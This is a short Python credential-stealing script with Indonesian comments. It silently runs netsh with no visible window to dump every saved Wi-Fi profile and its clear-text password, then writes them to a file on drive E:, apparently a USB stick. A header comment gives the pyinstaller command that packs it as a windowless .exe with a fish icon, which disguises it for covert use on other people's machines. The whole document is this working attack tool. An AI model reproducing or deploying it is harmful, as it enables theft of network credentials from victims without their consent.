#convert ke .exe pyinstaller --onefile --noconsole --icon="fish.ico" scan.py
#hasil data dat-w.txt
import subprocess
import os

def get_wifi_passwords():
    profiles_data = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    profiles_output = profiles_data.stdout

    profiles = []
    for line in profiles_output.splitlines():
        if "All User Profile" in line:
            name = line.split(":")[1].strip()
            profiles.append(name)
    
    output_lines = ["Daftar Wi-Fi dan Kata Sandi yang Tersimpan", "="*40, "\n"]
    
    for name in profiles:
        try:
            profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            profile_output = profile_info.stdout

            output_lines.append(f"Nama Wi-Fi: {name}")
            
            key_content_found = False
            for line in profile_output.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    output_lines.append(f"Kata Sandi: {password}\n")
                    key_content_found = True
                    break
            
            if not key_content_found:
                output_lines.append("Kata Sandi: Tidak ditemukan\n")
                
        except Exception as e:
            output_lines.append(f"Error saat memproses {name}: {e}\n")

    return "\n".join(output_lines)

def save_to_file(data, drive, filename):
    file_path = os.path.join(f"{drive}:\\", filename)
    try:
        with open(file_path, "w") as f:
            f.write(data)
        print(f"File berhasil disimpan di {file_path}")
    except Exception as e:
        print(f"Gagal menyimpan file: {e}")

if __name__ == "__main__":
    wifi_data = get_wifi_passwords()
    save_to_file(wifi_data, 'E', 'dat-w.txt')
